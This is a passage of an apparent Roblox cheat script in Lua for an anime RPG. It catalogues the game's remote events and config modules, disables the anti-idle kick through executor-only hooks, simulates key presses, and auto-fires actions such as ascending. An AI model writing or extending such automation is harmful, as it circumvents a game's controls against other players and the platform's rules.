    UseFruit = GetRemote(RS, 'RemoteEvents.FruitPowerRemote'),
    QuestAccept = GetRemote(RS, 'RemoteEvents.QuestAccept'),
    QuestAbandon = GetRemote(RS, 'RemoteEvents.QuestAbandon'),
    UseItem = GetRemote(RS, 'Remotes.UseItem'),
    SlimeCraft = GetRemote(RS, 'Remotes.RequestSlimeCraft'),
    GrailCraft = GetRemote(RS, 'Remotes.RequestGrailCraft'),
    RerollSingleStat = GetRemote(RS, 'Remotes.RerollSingleStat'),
    SkillTreeUpgrade = GetRemote(RS, 'RemoteEvents.SkillTreeUpgrade'),
    Enchant = GetRemote(RS, 'Remotes.EnchantAccessory'),
    Blessing = GetRemote(RS, 'Remotes.BlessWeapon'),
    ArtifactSync = GetRemote(RS, 'RemoteEvents.ArtifactDataSync'),
    ArtifactClaim = GetRemote(RS, 'RemoteEvents.ArtifactMilestoneClaimReward'),
    MassDelete = GetRemote(RS, 'RemoteEvents.ArtifactMassDeleteByUUIDs'),
    MassUpgrade = GetRemote(RS, 'RemoteEvents.ArtifactMassUpgrade'),
    ArtifactLock = GetRemote(RS, 'RemoteEvents.ArtifactLock'),
    ArtifactUnequip = GetRemote(RS, 'RemoteEvents.ArtifactUnequip'),
    ArtifactEquip = GetRemote(RS, 'RemoteEvents.ArtifactEquip'),
    Roll_Trait = GetRemote(RS, 'RemoteEvents.TraitReroll'),
    TraitAutoSkip = GetRemote(RS, 'RemoteEvents.TraitUpdateAutoSkip'),
    TraitConfirm = GetRemote(RS, 'RemoteEvents.TraitConfirm'),
    SpecPassiveReroll = GetRemote(RS, 'RemoteEvents.SpecPassiveReroll'),
    ArmHaki = GetRemote(RS, 'RemoteEvents.HakiRemote'),
    ObserHaki = GetRemote(RS, 'RemoteEvents.ObservationHakiRemote'),
    ConquerorHaki = GetRemote(RS, 'Remotes.ConquerorHakiRemote'),
    PowerRoll = GetRemote(RS, 'RemoteEvents.PowerReroll'),
    PowerSkip = GetRemote(RS, 'RemoteEvents.PowerUpdateAutoSkip'),
    UpPower = GetRemote(RS, 'RemoteEvents.PowerDataUpdate'),
    TP_Portal = GetRemote(RS, 'Remotes.TeleportToPortal'),
    OpenDungeon = GetRemote(RS, 'Remotes.RequestDungeonPortal'),
    EquipTitle = GetRemote(RS, 'RemoteEvents.TitleEquip'),
    TitleUnequip = GetRemote(RS, 'RemoteEvents.TitleUnequip'),
    EquipRune = GetRemote(RS, 'Remotes.EquipRune'),
    LoadoutLoad = GetRemote(RS, 'RemoteEvents.LoadoutLoad'),
    AddStat = GetRemote(RS, 'RemoteEvents.AllocateStat'),
    OpenMerchant = GetRemote(RS, 'Remotes.MerchantRemotes.OpenMerchantUI'),
    MerchantBuy = GetRemote(RS, 'Remotes.MerchantRemotes.PurchaseMerchantItem'),
    ValentineBuy = GetRemote(RS, 'Remotes.ValentineMerchantRemotes.PurchaseValentineMerchantItem'),
    StockUpdate = GetRemote(RS, 'Remotes.MerchantRemotes.MerchantStockUpdate'),
    SummonBoss = GetRemote(RS, 'Remotes.RequestSummonBoss'),
    JJKSummonBoss = GetRemote(RS, 'Remotes.RequestSpawnStrongestBoss'),
    RelicCraft = GetRemote(RS, 'Remotes.RequestRelicCraft'),
    RimuruBoss = GetRemote(RS, 'RemoteEvents.RequestSpawnRimuru'),
    AnosBoss = GetRemote(RS, 'Remotes.RequestSpawnAnosBoss'),
    TrueAizenBoss = GetRemote(RS, 'RemoteEvents.RequestSpawnTrueAizen'),
    ReqInventory = GetRemote(RS, 'Remotes.RequestInventory'),
    Ascend = GetRemote(RS, 'RemoteEvents.RequestAscend'),
    ReqAscend = GetRemote(RS, 'RemoteEvents.GetAscendData'),
    CloseAscend = GetRemote(RS, 'RemoteEvents.CloseAscendUI'),
    TradeRespond = GetRemote(RS, 'Remotes.TradeRemotes.RespondToRequest'),
    TradeSend = GetRemote(RS, 'Remotes.TradeRemotes.SendTradeRequest'),
    TradeAddItem = GetRemote(RS, 'Remotes.TradeRemotes.AddItemToTrade'),
    TradeReady = GetRemote(RS, 'Remotes.TradeRemotes.SetReady'),
    TradeConfirm = GetRemote(RS, 'Remotes.TradeRemotes.ConfirmTrade'),
    TradeUpdated = GetRemote(RS, 'Remotes.TradeRemotes.TradeUpdated'),
    HakiStateUpdate = GetRemote(RS, 'RemoteEvents.HakiStateUpdate'),
    UpCurrency = GetRemote(RS, 'RemoteEvents.UpdateCurrency'),
    UpInventory = GetRemote(RS, 'Remotes.UpdateInventory'),
    UpPlayerStats = GetRemote(RS, 'RemoteEvents.UpdatePlayerStats'),
    UpAscend = GetRemote(RS, 'RemoteEvents.AscendDataUpdate'),
    UpStatReroll = GetRemote(RS, 'RemoteEvents.StatRerollUpdate'),
    SpecPassiveUpdate = GetRemote(RS, 'RemoteEvents.SpecPassiveDataUpdate'),
    SpecPassiveSkip = GetRemote(RS, 'RemoteEvents.SpecPassiveUpdateAutoSkip'),
    UpSkillTree = GetRemote(RS, 'RemoteEvents.SkillTreeUpdate'),
    BossUIUpdate = GetRemote(RS, 'Remotes.BossUIUpdate'),
    TitleSync = GetRemote(RS, 'RemoteEvents.TitleDataSync'),
}
local Modules = {
    BossConfig = GetSafeModule(RS.Modules, 'BossConfig') or {Bosses = {}},
    TimedConfig = GetSafeModule(RS.Modules, 'TimedBossConfig'),
    SummonConfig = GetSafeModule(RS.Modules, 'SummonableBossConfig'),
    Merchant = GetSafeModule(RS.Modules, 'MerchantConfig') or {ITEMS = {}},
    ValentineConfig = GetSafeModule(RS.Modules, 'ValentineMerchantConfig'),
    Title = GetSafeModule(RS.Modules, 'TitlesConfig') or {},
    Quests = GetSafeModule(RS.Modules, 'QuestConfig') or {
        RepeatableQuests = {},
        Questlines = {},
    },
    WeaponClass = GetSafeModule(RS.Modules, 'WeaponClassification') or {Tools = {}},
    Fruits = GetSafeModule(RS:FindFirstChild('FruitPowerSystem') or game, 'FruitPowerConfig') or {Powers = {}},
    ArtifactConfig = GetSafeModule(RS.Modules, 'ArtifactConfig'),
    Stats = GetSafeModule(RS.Modules, 'StatRerollConfig') or {
        StatKeys = {},
        RankOrder = {},
    },
    Codes = GetSafeModule(RS, 'CodesConfig') or {Codes = {}},
    ItemRarity = GetSafeModule(RS.Modules, 'ItemRarityConfig'),
    Trait = GetSafeModule(RS.Modules, 'TraitConfig') or {Traits = {}},
    Race = GetSafeModule(RS.Modules, 'RaceConfig') or {Races = {}},
    Clan = GetSafeModule(RS.Modules, 'ClanConfig') or {Clans = {}},
    SpecPassive = GetSafeModule(RS.Modules, 'SpecPassiveConfig'),
}
local SummonMap = {}
local Shared = {
    GlobalPrio = 'FARM',
    Farm = true,
    LastRelicSwitch = 0,
    CosmicBossFound = false,
    SeaBossFound = false,
    Recovering = false,
    MovingIsland = false,
    Island = '',
    Target = nil,
    KillTick = 0,
    TargetValid = false,
    QuestNPC = '',
    MobIdx = 1,
    AllMobIdx = 1,
    WeapRotationIdx = 1,
    ComboIdx = 1,
    ParsedCombo = {},
    ActiveWeap = '',
    ArmHaki = false,
    CurrentPower = {
        Name = 'None',
        Buffs = {},
        MythicalBuff = 0,
    },
    LastSummon = 0,
    BossTIMap = {},
    InventorySynced = false,
    Stats = {},
    Settings = {},
    GemStats = {},
    SkillTree = {
        Nodes = {},
        Points = 0,
    },
    Passives = {},
    SpecStatsSlider = {},
    ArtifactSession = {
        Inventory = {},
        Dust = 0,
    },
    UpBlacklist = {},
    MerchantBusy = false,
    LocalMerchantTime = 0,
    LastTimerTick = tick(),
    MerchantExecute = false,
    FirstMerchantSync = false,
    CurrentStock = {},
    LastM1 = 0,
    LastWRSwitch = 0,
    LastSwitch = {
        Title = '',
        Rune = '',
        Build = '',
        Relic = '',
    },
    LastBuildSwitch = 0,
    LastDungeon = 0,
    AltDamage = {},
    AltActive = false,
    TradeState = {},
}
local Script_Start_Time = os.time()
local StartStats = {
    Level = Plr.Data.Level.Value,
    Money = Plr.Data.Money.Value,
    Gems = Plr.Data.Gems.Value,
    Bounty = (Plr:FindFirstChild('leaderstats') and Plr.leaderstats:FindFirstChild('Bounty') and Plr.leaderstats.Bounty.Value) or 0,
}
local NewItemsBuffer = {}
local Toggles = {}
local Options = {}
local PATH = {
    Mobs = workspace:WaitForChild('NPCs', 0.8) or workspace:FindFirstChild('NPCs') or Instance.new('Folder'),
    InteractNPCs = workspace:WaitForChild('ServiceNPCs', 0.8) or workspace:FindFirstChild('ServiceNPCs') or Instance.new('Folder'),
}
local MerchantItemList = Modules.Merchant.ITEMS
local SortedTitleList = Modules.Title.GetSortedTitleIds and Modules.Title:GetSortedTitleIds() or {}
local Tables = {
    AscendLabels = {},
    RelicList = {
        'Crit Chance Relic',
        'Crit Damage Relic',
        'Damage Relic',
        'Luck Relic',
    },
    DiffList = {
        'Normal',
        'Medium',
        'Hard',
        'Extreme',
    },
    MobList = {},
    BloodlineList = {},
    MiniBossList = {
        'ThiefBoss',
        'MonkeyBoss',
        'DesertBoss',
        'SnowBoss',
        'PandaMiniBoss',
    },
    BossList = {},
    AllBossList = {},
    AllNPCList = {},
    AllEntitiesList = {},
    SummonList = {},
    OtherSummonList = {
        'StrongestHistory',
        'StrongestToday',
        'Rimuru',
        'Anos',
        'TrueAizen',
        'GreatMage',
    },
    Weapon = {
        'Melee',
        'Sword',
        'Power',
    },
    ManualWeaponClass = {
        Invisible = 'Power',
        Bomb = 'Power',
        Quake = 'Power',
        ['Soul Reaper'] = 'Sword',
        Light = 'Power',
    },
    MerchantList = {},
    ValentineMerchantList = {},
    Rarities = {
        'Common',
        'Rare',
        'Epic',
        'Legendary',
        'Mythical',
        'Secret',
        'Aura Crate',
        'Cosmetic Crate',
    },
    CraftItemList = {
        'SlimeKey',
        'DivineGrail',
    },
    UnlockedTitle = {},
    TitleCategory = {
        'None',
        'Best EXP',
        'Best Money & Gem',
        'Best Luck',
        'Best DMG',
    },
    TitleList = {},
    BuildList = {
        '1',
        '2',
        '3',
        '4',
        '5',
        'None',
    },
    TraitList = {},
    RarityWeight = {
        Secret = 1,
        Mythical = 2,
        Legendary = 3,
        Epic = 4,
        Rare = 5,
        Uncommon = 6,
        Common = 7,
    },
    RaceList = {},
    ClanList = {},
    RuneList = {
        'None',
    },
    PowerList = {},
    SpecPassive = {},
    GemStat = (Modules.Stats and Modules.Stats.StatKeys) or {},
    GemRank = (Modules.Stats and Modules.Stats.RankOrder) or {},
    OwnedWeapon = {},
    AllOwnedWeapons = {},
    OwnedAccessory = {},
    QuestlineList = {},
    OwnedItem = {},
    IslandList = {},
    NPC_QuestList = {
        'DungeonUnlock',
        'SlimeKeyUnlock',
    },
    NPC_MiscList = {
        'Artifacts',
        'Blessing',
        'Enchant',
        'SkillTree',
        'Cupid',
        'ArmHaki',
        'Observation',
        'Conqueror',
    },
    DungeonList = {
        'CidDungeon',
        'RuneDungeon',
        'DoubleDungeon',
        'BossRush',
        'InfiniteTower',
    },
    NPC_MovesetList = {},
    NPC_MasteryList = {},
    MobToIsland = {},
}
local DefaultPriority = {
    'Nearest Mob',
    'Level Farm',
    'Mob',
    'All Mob Farm',
    'Boss',
    'Pity Boss',
    'Summon',
    'Merchant',
    'Alt Help',
    'Sea Boss',
}
local IslandCrystals = {}

local function InitializeIslands()
    local TravelConfig = GetSafeModule(RS.Modules, 'TravelConfig')

    if not TravelConfig or not TravelConfig.Zones then
        for _, obj in ipairs(workspace:GetDescendants())do
            local attr = obj:GetAttribute('CheckpointName')

            if attr then
                local baseName = attr:gsub(' Island', ''):gsub(' Station', '')

                IslandCrystals[baseName] = obj

                if not table.find(Tables.IslandList, baseName) then
                    table.insert(Tables.IslandList, baseName)
                end
            end
        end

        table.sort(Tables.IslandList)

        return
    end

    local crystalCache = {}

    for _, obj in ipairs(workspace:GetDescendants())do
        local attr = obj:GetAttribute('CheckpointName')

        if attr then
            crystalCache[attr] = obj
        end
    end
    for internalName, data in pairs(TravelConfig.Zones)do
        local baseName = internalName:gsub('Island', ''):gsub('Station', '')
        local displayName = data.DisplayName
        local crystal = crystalCache[displayName]

        if crystal then
            IslandCrystals[baseName] = crystal
        end
        if not table.find(Tables.IslandList, baseName) then
            table.insert(Tables.IslandList, baseName)
        end
    end

    table.sort(Tables.IslandList)
end

InitializeIslands()

local Connections = {
    Player_General = nil,
    Idled = nil,
    Merchant = nil,
    Dash = nil,
    Knockback = {},
    Reconnect = nil,
}
local Flags = {}

pcall(function()
    if Modules.TimedConfig and Modules.TimedConfig.Bosses then
        for _, data in pairs(Modules.TimedConfig.Bosses)do
            table.insert(Tables.BossList, data.displayName)

            local tpName = data.spawnLocation:gsub(' Island', ''):gsub(' Station', '')

            if data.spawnLocation == 'Hueco Mundo Island' then
                tpName = 'HuecoMundo'
            end
            if data.spawnLocation == 'Judgement Island' then
                tpName = 'Judgement'
            end

            Shared.BossTIMap[data.displayName] = tpName
        end

        table.sort(Tables.BossList)
    end
end)
pcall(function()
    if Modules.SummonConfig and Modules.SummonConfig.Bosses then
        for _, data in pairs(Modules.SummonConfig.Bosses)do
            table.insert(Tables.SummonList, data.displayName)

            SummonMap[data.displayName] = data.bossId
        end

        table.sort(Tables.SummonList)
    end
end)
pcall(function()
    if Modules.BossConfig and Modules.BossConfig.Bosses then
        for bossInternalName in pairs(Modules.BossConfig.Bosses)do
            table.insert(Tables.AllBossList, bossInternalName)
        end

        table.sort(Tables.AllBossList)
    end
end)
pcall(function()
    if MerchantItemList then
        for itemName in pairs(MerchantItemList)do
            table.insert(Tables.MerchantList, itemName)
        end
    end
end)
pcall(function()
    if SortedTitleList then
        for _, v in ipairs(SortedTitleList)do
            table.insert(Tables.TitleList, v)
        end

        local CombinedTitleList = {}

        for _, cat in ipairs(Tables.TitleCategory)do
            table.insert(CombinedTitleList, cat)
        end
        for _, t in ipairs(Tables.TitleList)do
            table.insert(CombinedTitleList, t)
        end
    end
end)
pcall(function()
    if Modules.Trait and Modules.Trait.Traits then
        for k in pairs(Modules.Trait.Traits)do
            table.insert(Tables.TraitList, k)
        end

        table.sort(Tables.TraitList, function(a, b)
            local wa = Tables.RarityWeight[Modules.Trait.Traits[a] and Modules.Trait.Traits[a].Rarity] or 99
            local wb = Tables.RarityWeight[Modules.Trait.Traits[b] and Modules.Trait.Traits[b].Rarity] or 99

            return wa ~= wb and wa < wb or a < b
        end)
    end
end)
pcall(function()
    if Modules.Race and Modules.Race.Races then
        for k in pairs(Modules.Race.Races)do
            table.insert(Tables.RaceList, k)
        end

        table.sort(Tables.RaceList, function(a, b)
            local wa = Tables.RarityWeight[Modules.Race.Races[a] and (Modules.Race.Races[a].rarity or Modules.Race.Races[a].Rarity)] or 99
            local wb = Tables.RarityWeight[Modules.Race.Races[b] and (Modules.Race.Races[b].rarity or Modules.Race.Races[b].Rarity)] or 99

            return wa ~= wb and wa < wb or a < b
        end)
    end
end)
pcall(function()
    if Modules.Clan and Modules.Clan.Clans then
        for k in pairs(Modules.Clan.Clans)do
            table.insert(Tables.ClanList, k)
        end

        table.sort(Tables.ClanList, function(a, b)
            local wa = Tables.RarityWeight[Modules.Clan.Clans[a] and (Modules.Clan.Clans[a].rarity or Modules.Clan.Clans[a].Rarity)] or 99
            local wb = Tables.RarityWeight[Modules.Clan.Clans[b] and (Modules.Clan.Clans[b].rarity or Modules.Clan.Clans[b].Rarity)] or 99

            return wa ~= wb and wa < wb or a < b
        end)
    end
end)
pcall(function()
    local BloodlineMod = GetSafeModule(RS.Modules, 'BloodlineConfig') or GetSafeModule(RS.Modules, 'BloodlineRerollConfig')

    if BloodlineMod then
        local src = BloodlineMod.Bloodlines or BloodlineMod.Clans or {}

        for k in pairs(src)do
            table.insert(Tables.BloodlineList, k)
        end

        table.sort(Tables.BloodlineList, function(a, b)
            local wa = Tables.RarityWeight[src[a] and (src[a].rarity or src[a].Rarity)] or 99
            local wb = Tables.RarityWeight[src[b] and (src[b].rarity or src[b].Rarity)] or 99

            return wa ~= wb and wa < wb or a < b
        end)
    end
end)
pcall(function()
    if Modules.SpecPassive and Modules.SpecPassive.Passives then
        for k in pairs(Modules.SpecPassive.Passives)do
            table.insert(Tables.SpecPassive, k)
        end

        table.sort(Tables.SpecPassive)
    end
end)
pcall(function()
    local PowerMod = nil

    pcall(function()
        PowerMod = require(RS.Modules:FindFirstChild('PowerConfig'))
    end)

    if PowerMod and PowerMod.Powers then
        for k in pairs(PowerMod.Powers)do
            table.insert(Tables.PowerList, k)
        end

        table.sort(Tables.PowerList)
    end
end)
pcall(function()
    if Modules.Quests and Modules.Quests.Questlines then
        for k in pairs(Modules.Quests.Questlines)do
            table.insert(Tables.QuestlineList, k)
        end

        table.sort(Tables.QuestlineList)
    end
end)
pcall(function()
    local allSets = {}

    if Modules.ArtifactConfig and Modules.ArtifactConfig.Sets then
        for k in pairs(Modules.ArtifactConfig.Sets)do
            table.insert(allSets, k)
        end
    end

    local allStats = {}

    if Modules.ArtifactConfig and Modules.ArtifactConfig.Stats then
        for k in pairs(Modules.ArtifactConfig.Stats)do
            table.insert(allStats, k)
        end
    end
end)

for _, v in ipairs(PATH.InteractNPCs:GetChildren())do
    if not table.find(Tables.AllNPCList, v.Name) then
        table.insert(Tables.AllNPCList, v.Name)
    end
end

table.sort(Tables.AllNPCList)
task.spawn(function()
    task.wait(5)

    local changed = false

    for _, v in ipairs(PATH.InteractNPCs:GetChildren())do
        if not table.find(Tables.AllNPCList, v.Name) then
            table.insert(Tables.AllNPCList, v.Name)

            changed = true
        end
    end

    if changed then
        table.sort(Tables.AllNPCList)
    end
end)

function ToSet(v)
    if type(v) ~= 'table' then
        return {[v] = true}
    end

    local s = {}

    for k, val in pairs(v)do
        if type(k) == 'number' then
            s[val] = true
        else
            s[k] = val
        end
    end

    return s
end
function GetSessionTime()
    local s = os.time() - Script_Start_Time

    return string.format('%dh %02dm', math.floor(s / 3600), math.floor((s % 3600) / 60))
end
function CommaFormat(n)
    return tostring(n):reverse():gsub('%d%d%d', '%1,'):reverse():gsub('^,', '')
end
function Abbreviate(n)
    for _, v in ipairs({
        {
            1e12,
            'T',
        },
        {
            1e9,
            'B',
        },
        {
            1e6,
            'M',
        },
        {
            1e3,
            'K',
        },
    })do
        if n >= v[1] then
            return string.format('%.1f%s', n / v[1], v[2])
        end
    end

    return tostring(n)
end
function Clean(str)
    return str:gsub('%s+', ''):lower()
end
function GetCharacter()
    local c = Plr.Character

    return (c and c:FindFirstChild('HumanoidRootPart') and c:FindFirstChildOfClass('Humanoid')) and c or nil
end
function IsBusy()
    return Plr.Character and Plr.Character:FindFirstChildOfClass('ForceField') ~= nil
end
function GetNearestIsland(targetPos, npcName)
    if npcName and Shared.BossTIMap[npcName] then
        return Shared.BossTIMap[npcName]
    end

    local best, minDist = 'Starter', math.huge

    for name, crystal in pairs(IslandCrystals)do
        if crystal then
            local d = (targetPos - crystal:GetPivot().Position).Magnitude

            if d < minDist then
                minDist = d
                best = name
            end
        end
    end

    return best
end
function GetToolTypeFromModule(toolName)
    local cleaned = Clean(toolName)

    for mName, toolType in pairs(Tables.ManualWeaponClass)do
        if Clean(mName) == cleaned then
            return toolType
        end
    end

    if Modules.WeaponClass and Modules.WeaponClass.Tools then
        for mName, toolType in pairs(Modules.WeaponClass.Tools)do
            if Clean(mName) == cleaned then
                return toolType
            end
        end
    end
    if toolName:lower():find('fruit') then
        return 'Power'
    end

    return 'Melee'
end
function IsSmartMatch(npcName, target)
    local n, t = npcName:gsub('%d+$', ''):lower(), target:lower()

    return n == t or t:find(n) == 1 or n:find(t) == 1
end
function IsStrictBossMatch(npcName, displayName)
    local n = npcName:lower():gsub('%s+', '')
    local t = displayName:lower():gsub('%s+', '')

    if n:find('true') and not t:find('true') then
        return false
    end
    if t:find('strongest') then
        local era = t:find('history') and 'history' or 'today'

        return n:find('strongest') and n:find(era)
    end

    return n:find(t)
end
function GetRemoteBossArg(name)
    local map = {
        strongestinhistory = 'StrongestHistory',
        strongestoftoday = 'StrongestToday',
        strongesthistory = 'StrongestHistory',
        strongesttoday = 'StrongestToday',
    }

    return map[name:lower()] or name
end
function GetCurrentPity()
    local ok, lbl = pcall(function()
        return PGui.BossUI.MainFrame.BossHPBar.Pity
    end)

    if not ok or not lbl then
        return 0, 25
    end

    local rawText = lbl.Text:gsub('<[^>]+>', '')
    local cur, max = rawText:match('Pity:%s*(%d+)/(%d+)')

    return tonumber(cur) or 0, tonumber(max) or 25
end
function IsBossAlreadySpawned(displayName)
    local searchStr = displayName:lower():gsub('%s+', '')

    for _, npc in pairs(PATH.Mobs:GetChildren())do
        local n = npc.Name:lower():gsub('%s+', '')

        if n:find(searchStr, 1, true) or searchStr:find(n, 1, true) then
            local hum = npc:FindFirstChildOfClass('Humanoid')

            if hum and hum.Health > 0 then
                return true
            end
        end
    end

    return false
end
function IsSummonable(displayName)
    if table.find(Tables.SummonList, displayName) then
        return true
    end
    if table.find(Tables.OtherSummonList, displayName) then
        return true
    end
    if table.find(Tables.BossList, displayName) then
        return true
    end

    return false
end
function GetCombinedSummonList()
    local combined = {}

    for _, v in ipairs(Tables.SummonList)do
        table.insert(combined, v)
    end
    for _, v in ipairs(Tables.OtherSummonList)do
        if not table.find(combined, v) then
            table.insert(combined, v)
        end
    end

    return combined
end
function FindRemoteDynamic(remoteName)
    for _, folder in pairs({
        RS:FindFirstChild('Remotes'),
        RS:FindFirstChild('RemoteEvents'),
    })do
        if folder then
            local obj = folder:FindFirstChild(remoteName)

            if obj then
                return obj
            end
        end
    end

    return nil
end

local _BossRemoteCache = {}

function SafeLoop(name, func)
    return function()
        local ok, err = pcall(func)

        if not ok then
            UI:Notify({
                Title = 'Error [' .. name .. ']',
                Description = tostring(err),
                Duration = 8,
            })
            warn('Error in [' .. name .. ']: ' .. tostring(err))
        end
    end
end
function Thread(featurePath, featureFunc, isEnabled, ...)
    local parts = featurePath:split('.')
    local cur = Flags

    for i = 1, #parts - 1 do
        local p = parts[i]

        if not cur[p] then
            cur[p] = {}
        end

        cur = cur[p]
    end

    local key = parts[#parts]
    local active = cur[key]

    if isEnabled then
        if not active or coroutine.status(active) == 'dead' then
            cur[key] = task.spawn(featureFunc, ...)
        end
    else
        if active and typeof(active) == 'thread' then
            task.cancel(active)

            cur[key] = nil
        end
    end
end
function Cleanup(tbl)
    for k, v in pairs(tbl)do
        if typeof(v) == 'RBXScriptConnection' then
            v:Disconnect()

            tbl[k] = nil
        elseif typeof(v) == 'thread' then
            task.cancel(v)

            tbl[k] = nil
        elseif type(v) == 'table' then
            Cleanup(v)
        end
    end
end
function DisableIdled()
    pcall(function()
        local cons = getconnections or get_signal_cons

        if cons then
            for _, v in pairs(cons(Plr.Idled))do
                if v.Disable then
                    v:Disable()
                elseif v.Disconnect then
                    v:Disconnect()
                end
            end
        end
    end)
end
function gsc(guiObject)
    if not guiObject then
        return false
    end

    local ok = false

    pcall(function()
        if Services.GuiService and Services.VirtualInputManager then
            Services.GuiService.SelectedObject = guiObject

            task.wait(0.05)

            for _, key in ipairs({
                Enum.KeyCode.Return,
                Enum.KeyCode.KeypadEnter,
                Enum.KeyCode.ButtonA,
            })do
                Services.VirtualInputManager:SendKeyEvent(true, key, false, game)
                task.wait(0.03)
                Services.VirtualInputManager:SendKeyEvent(false, key, false, game)
                task.wait(0.03)
            end

            Services.GuiService.SelectedObject = nil
            ok = true
        end
    end)

    return ok
end
function GetSecondsFromTimer(text)
    local m, s = text:match('(%d+):(%d+)')

    return m and s and (tonumber(m) * 60 + tonumber(s)) or nil
end
function FormatSecondsToTimer(s)
    return string.format('Refresh: %02d:%02d', math.floor(s / 60), s % 60)
end

Remotes.UpInventory.OnClientEvent:Connect(function(category, data)
    Shared.InventorySynced = true

    if category == 'Items' then
        Shared.Cached_Inv = data or {}

        table.clear(Tables.OwnedItem)

        for _, item in pairs(data)do
            if not table.find(Tables.OwnedItem, item.name) then
                table.insert(Tables.OwnedItem, item.name)
            end
        end

        table.sort(Tables.OwnedItem)
    elseif category == 'Runes' then
        table.clear(Tables.RuneList)
        table.insert(Tables.RuneList, 'None')

        for name in pairs(data)do
            table.insert(Tables.RuneList, name)
        end

        table.sort(Tables.RuneList)
    elseif category == 'Accessories' then
        Shared.Cached_Accessories = {}

        table.clear(Tables.OwnedAccessory)

        local seen = {}

        for _, item in ipairs(data)do
            Shared.Cached_Accessories[item.name] = (item.quantity or 0)

            if (item.enchantLevel or 0) < 10 and not seen[item.name] then
                table.insert(Tables.OwnedAccessory, item.name)

                seen[item.name] = true
            end
        end

        table.sort(Tables.OwnedAccessory)
    elseif category == 'Sword' or category == 'Melee' then
        Shared['RawWeap_' .. category] = data or {}

        table.clear(Tables.OwnedWeapon)
        table.clear(Tables.AllOwnedWeapons)

        local seen1, seen2 = {}, {}

        for _, cat in pairs({
            'Sword',
            'Melee',
        })do
            for _, item in ipairs(Shared['RawWeap_' .. cat] or {})do
                if (item.blessingLevel or 0) < 10 and not seen1[item.name] then
                    table.insert(Tables.OwnedWeapon, item.name)

                    seen1[item.name] = true
                end
                if not seen2[item.name] then
                    table.insert(Tables.AllOwnedWeapons, item.name)

                    seen2[item.name] = true
                end
            end
        end

        table.sort(Tables.OwnedWeapon)
        table.sort(Tables.AllOwnedWeapons)
    end
end)
RS.Remotes.NotifyItemDrop.OnClientEvent:Connect(function(data)
    if not data or type(data) ~= 'table' or not data.name then
        return
    end

    NewItemsBuffer[data.name] = (NewItemsBuffer[data.name] or 0) + (data.quantity or 1)
end)
Remotes.StockUpdate.OnClientEvent:Connect(function(itemName, stockLeft)
    Shared.CurrentStock[itemName] = tonumber(stockLeft)
end)
Remotes.UpSkillTree.OnClientEvent:Connect(function(data)
    if data then
        Shared.SkillTree.Nodes = data.Nodes or {}
        Shared.SkillTree.SkillPoints = data.SkillPoints or 0
    end
end)

if Remotes.SettingsSync then
    Remotes.SettingsSync.OnClientEvent:Connect(function(data)
        Shared.Settings = data
    end)
end

Remotes.ArtifactSync.OnClientEvent:Connect(function(data)
    Shared.ArtifactSession.Inventory = data.Inventory
    Shared.ArtifactSession.Dust = data.Dust
end)
Remotes.TitleSync.OnClientEvent:Connect(function(data)
    if data and data.unlocked then
        Tables.UnlockedTitle = data.unlocked
    end
end)
Remotes.HakiStateUpdate.OnClientEvent:Connect(function(a, b)
    if a == false then
        Shared.ArmHaki = false

        return
    end
    if a == Plr then
        Shared.ArmHaki = b
    end
end)

if Remotes.BossUIUpdate then
    Remotes.BossUIUpdate.OnClientEvent:Connect(function(mode, data)
        if mode == 'DamageStats' and data.stats then
            for _, info in pairs(data.stats)do
                if info.player and info.player:IsA('Player') then
                    Shared.AltDamage[info.player.Name] = tonumber(info.percent) or 0
                end
            end
        end
    end)
end

Remotes.TradeUpdated.OnClientEvent:Connect(function(data)
    Shared.TradeState = data
end)
PATH.Mobs.ChildRemoved:Connect(function(child)
    if child:IsA('Model') and child.Name:lower():find('boss') then
        table.clear(Shared.AltDamage)

        Shared.AltActive = false
    end
end)
Remotes.SpecPassiveUpdate.OnClientEvent:Connect(function(data)
    if type(Shared.Passives) ~= 'table' then
        Shared.Passives = {}
    end
    if data and data.Passives then
        for weapName, info in pairs(data.Passives)do
            Shared.Passives[weapName] = type(info) == 'table' and info or {
                Name = tostring(info),
                RolledBuffs = {},
            }
        end
    end
end)

if Remotes.UpPower then
    Remotes.UpPower.OnClientEvent:Connect(function(data)
        if data and data.Current then
            Shared.CurrentPower.Name = data.Current.Name or 'None'
            Shared.CurrentPower.Buffs = data.Current.RolledBuffs or {}
        end
    end)
end

Remotes.UpStatReroll.OnClientEvent:Connect(function(data)
    if data and data.Stats then
        Shared.GemStats = data.Stats
    end
end)
Remotes.UpPlayerStats.OnClientEvent:Connect(function(data)
    if data and data.Stats then
        Shared.Stats = data.Stats
    end
end)
Remotes.UpAscend.OnClientEvent:Connect(function(data)
    if not (Toggles.AutoAscend and Toggles.AutoAscend.Value) then
        return
    end

    UpdateAscendLabels(data)

    if data.isMaxed then
        if Toggles.AutoAscend then
            Toggles.AutoAscend.Value = false
        end

        return
    end
    if data.allMet then
        UI:Notify({
            Title = 'Ascend',
            Description = 'All requirements met! Ascending to: ' .. tostring(data.nextRankName),
            Duration = 5,
        })
        Remotes.Ascend:FireServer()
        task.wait(1)
    end
end)

function UpdateNPCLists()
    local special = {
        'ThiefBoss',
        'MonkeyBoss',
        'DesertBoss',
        'SnowBoss',
        'PandaMiniBoss',
    }
    local current = {}

    for _, n in pairs(Tables.MobList)do
        current[n] = true
    end
    for _, v in pairs(PATH.Mobs:GetChildren())do
        local clean = v.Name:gsub('%d+$', '')

        if (table.find(special, clean) or not clean:find('Boss')) and not current[clean] then
            table.insert(Tables.MobList, clean)

            current[clean] = true

            local best, minD = 'Unknown', math.huge

            for iname, crystal in pairs(IslandCrystals)do
                if crystal then
                    local d = (v:GetPivot().Position - crystal:GetPivot().Position).Magnitude

                    if d < minD then
                        minD = d
                        best = iname
                    end
                end
            end

            Tables.MobToIsland[clean] = best
        end
    end
end
function UpdateAllEntities()
    table.clear(Tables.AllEntitiesList)

    local unique = {}

    for _, v in pairs(PATH.Mobs:GetChildren())do
        local c = v.Name:gsub('%d+$', '')

        if not unique[c] then
            unique[c] = true

            table.insert(Tables.AllEntitiesList, c)
        end
    end

    table.sort(Tables.AllEntitiesList)
end
function PopulateNPCLists()
    for _, child in ipairs(workspace:GetChildren())do
        if child.Name:match('^QuestNPC%d+$') and not table.find(Tables.NPC_QuestList, child.Name) then
            table.insert(Tables.NPC_QuestList, child.Name)
        end
    end
    for _, child in ipairs(PATH.InteractNPCs:GetChildren())do
        if child.Name:match('^QuestNPC%d+$') and not table.find(Tables.NPC_QuestList, child.Name) then
            table.insert(Tables.NPC_QuestList, child.Name)
        end

        local n = child.Name

